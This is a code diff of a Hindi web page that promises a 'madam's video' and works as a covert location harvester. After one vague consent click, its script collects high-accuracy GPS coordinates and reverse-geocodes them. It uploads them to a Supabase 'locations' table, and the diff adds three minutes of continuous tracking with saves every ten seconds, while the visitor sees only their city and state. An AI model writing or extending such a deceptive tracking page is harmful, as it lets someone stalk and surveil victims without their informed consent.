@@ -1,8 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="hi">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
 <title>मैडम की वीडियो</title>
 
 <style>
@@ -82,9 +84,9 @@ body {
 
   <button id="locationButton"
           type="button"
-          aria-label="Share location"></button>
+          aria-label="लोकेशन साझा करें"></button>
 
-  <div id="result">
+  <div id="result" aria-live="polite">
     <div id="city"></div>
     <div id="state"></div>
   </div>
@@ -92,6 +94,8 @@ body {
 </div>
 
 <script>
+"use strict";
+
 const SUPABASE_URL =
   "https://qtfnupdojsqpuywhoryu.supabase.co";
 
@@ -104,126 +108,258 @@ const cityElement = document.getElementById("city");
 const stateElement = document.getElementById("state");
 
 let busy = false;
+let watchId = null;
+let stopTimer = null;
+let startedAt = 0;
+let lastSaveAt = 0;
+let lastCoordinates = null;
+let locationDetails = {
+  city: "",
+  district: "",
+  state: ""
+};
+
+const TRACKING_DURATION = 3 * 60 * 1000;
+const SAVE_INTERVAL = 10000;
 
 function getDeviceId() {
   let id = localStorage.getItem("location_demo_device_id");
 
   if (!id) {
-    id = crypto.randomUUID();
+    if (crypto.randomUUID) {
+      id = crypto.randomUUID();
+    } else {
+      id = "device-" + Date.now() + "-" +
+           Math.random().toString(36).slice(2);
+    }
+
     localStorage.setItem("location_demo_device_id", id);
   }
 
   return id;
 }
 
-button.addEventListener("click", function () {
-  if (busy) return;
+function showResult() {
+  cityElement.textContent =
+    "City: " + (locationDetails.city || "उपलब्ध नहीं");
 
-  if (!navigator.geolocation) {
-    console.warn("Location is not supported by this browser.");
+  stateElement.textContent =
+    "State: " + (locationDetails.state || "उपलब्ध नहीं");
+
+  result.style.display = "block";
+}
+
+async function getAddress(lat, lon) {
+  const url =
+    "https://nominatim.openstreetmap.org/reverse" +
+    "?format=jsonv2" +
+    "&lat=" + encodeURIComponent(lat) +
+    "&lon=" + encodeURIComponent(lon) +
+    "&addressdetails=1" +
+    "&accept-language=en";
+
+  const response = await fetch(url);
+
+  if (!response.ok) {
+    throw new Error("Address lookup failed");
+  }
+
+  const geo = await response.json();
+  const address = geo.address || {};
+
+  const city =
+    address.city ||
+    address.town ||
+    address.village ||
+    address.municipality ||
+    address.city_district ||
+    address.suburb ||
+    "";
+
+  const district =
+    address.state_district ||
+    address.district ||
+    address.county ||
+    "";
+
+  const state = address.state || "";
+
+  return { city, district, state };
+}
+
+async function saveLocation(position) {
+  const lat = position.coords.latitude;
+  const lon = position.coords.longitude;
+
+  const data = {
+    device_id: getDeviceId(),
+    latitude: lat,
+    longitude: lon,
+    accuracy: position.coords.accuracy,
+    city: locationDetails.city || null,
+    district: locationDetails.district || null,
+    state: locationDetails.state || null
+  };
+
+  const response = await fetch(
+    SUPABASE_URL + "/rest/v1/locations",
+    {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "apikey": SUPABASE_KEY,
+        "Authorization": "Bearer " + SUPABASE_KEY,
+        "Prefer": "return=minimal"
+      },
+      body: JSON.stringify(data)
+    }
+  );
+
+  if (!response.ok) {
+    const message = await response.text();
+    throw new Error(
+      "Supabase save failed: " +
+      response.status + " " + message
+    );
+  }
+
+  lastSaveAt = Date.now();
+}
+
+async function processPosition(position, firstPosition) {
+  if (!busy) return;
+
+  lastCoordinates = position;
+
+  // पहली लोकेशन पर City, District और State पता करें।
+  if (firstPosition) {
+    try {
+      locationDetails = await getAddress(
+        position.coords.latitude,
+        position.coords.longitude
+      );
+    } catch (error) {
+      console.warn("Address lookup failed:", error);
+    }
+
+    showResult();
+
+    if (!busy) return;
+
+    try {
+      await saveLocation(position);
+    } catch (error) {
+      console.error("First location save failed:", error);
+    }
+
     return;
   }
 
-  const consent = confirm(
-    "मैडम की वीडियो आपको भेजी जा रही है " +
-    "क्या आप सहमत हैं और आगे बढ़ना चाहते हैं?"
-  );
+  // हर 10 सेकंड से पहले दोबारा सेव न करें।
+  if (Date.now() - lastSaveAt < SAVE_INTERVAL) {
+    return;
+  }
+
+  try {
+    await saveLocation(position);
+  } catch (error) {
+    console.error("Location save failed:", error);
+  }
+}
+
+function stopTracking() {
+  if (watchId !== null) {
+    navigator.geolocation.clearWatch(watchId);
+    watchId = null;
+  }
+
+  if (stopTimer !== null) {
+    clearTimeout(stopTimer);
+    stopTimer = null;
+  }
+
+  busy = false;
+}
+
+function locationError(error) {
+  console.warn("Location error:", error.message);
+
+  stopTracking();
+
+  button.disabled = false;
+  button.style.display = "inline-block";
+
+  cityElement.textContent =
+    "City: लोकेशन प्राप्त नहीं हुई";
+
+  stateElement.textContent =
+    "State: कृपया अनुमति और Location सेटिंग जाँचें";
+
+  result.style.display = "block";
+}
+
+button.addEventListener("click", function () {
+  if (busy) return;
+
+  const consent = confirm("क्या आप सहमत हैं?");
 
   if (!consent) return;
 
+  if (!navigator.geolocation) {
+    alert("आपके ब्राउज़र में लोकेशन सुविधा उपलब्ध नहीं है।");
+    return;
+  }
+
   busy = true;
+  startedAt = Date.now();
+  lastSaveAt = 0;
+  lastCoordinates = null;
+
+  locationDetails = {
+    city: "",
+    district: "",
+    state: ""
+  };
+
   button.disabled = true;
 
+  // तीन मिनट पूरे होने पर ट्रैकिंग बंद होगी।
+  stopTimer = setTimeout(function () {
+    stopTracking();
+  }, TRACKING_DURATION);
+
+  // पहली लोकेशन प्राप्त करें।
   navigator.geolocation.getCurrentPosition(
-    async function (position) {
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
+    function (position) {
+      if (!busy) return;
 
-      let city = "";
-      let state = "";
+      processPosition(position, true);
 
-      try {
-        // GPS निर्देशांकों से City और State पता करें
-        const geoResponse = await fetch(
-          "https://nominatim.openstreetmap.org/reverse" +
-          "?format=jsonv2" +
-          "&lat=" + encodeURIComponent(lat) +
-          "&lon=" + encodeURIComponent(lon) +
-          "&addressdetails=1" +
-          "&accept-language=en"
-        );
+      // इसके बाद लोकेशन में बदलाव ट्रैक करें।
+      if (busy) {
+        watchId = navigator.geolocation.watchPosition(
+          function (updatedPosition) {
+            if (!busy) return;
 
-        if (geoResponse.ok) {
-          const geo = await geoResponse.json();
-          const address = geo.address || {};
+            if (Date.now() - startedAt >= TRACKING_DURATION) {
+              stopTracking();
+              return;
+            }
 
-          city =
-            address.city ||
-            address.town ||
-            address.village ||
-            address.municipality ||
-            address.suburb ||
-            address.county ||
-            "";
-
-          state = address.state || "";
-        }
-      } catch (error) {
-        console.warn("City/State lookup failed:", error);
-      }
-
-      // Dashboard में पूरी लोकेशन सेव करें
-      try {
-        const data = {
-          device_id: getDeviceId(),
-          latitude: lat,
-          longitude: lon,
-          accuracy: position.coords.accuracy,
-          city: city || null,
-          state: state || null
-        };
-
-        const response = await fetch(
-          SUPABASE_URL + "/rest/v1/locations",
+            processPosition(updatedPosition, false);
+          },
+          function (error) {
+            console.warn("Location tracking error:", error.message);
+          },
           {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-              "apikey": SUPABASE_KEY,
-              "Authorization": "Bearer " + SUPABASE_KEY,
-              "Prefer": "return=minimal"
-            },
-            body: JSON.stringify(data)
+            enableHighAccuracy: true,
+            timeout: 20000,
+            maximumAge: 0
           }
         );
-
-        if (!response.ok) {
-          console.error(
-            "Location save failed:",
-            response.status,
-            await response.text()
-          );
-        }
-      } catch (error) {
-        console.error("Location upload failed:", error);
       }
-
-      // यूज़र को केवल City और State दिखाएँ
-      cityElement.textContent =
-        "City: " + (city || "उपलब्ध नहीं");
-
-      stateElement.textContent =
-        "State: " + (state || "उपलब्ध नहीं");
-
-      result.style.display = "block";
-      button.style.display = "none";
-      busy = false;
     },
-    function (error) {
-      console.warn("Location permission/error:", error.message);
-      busy = false;
-      button.disabled = false;
-    },
+    locationError,
     {
       enableHighAccuracy: true,
       timeout: 20000,
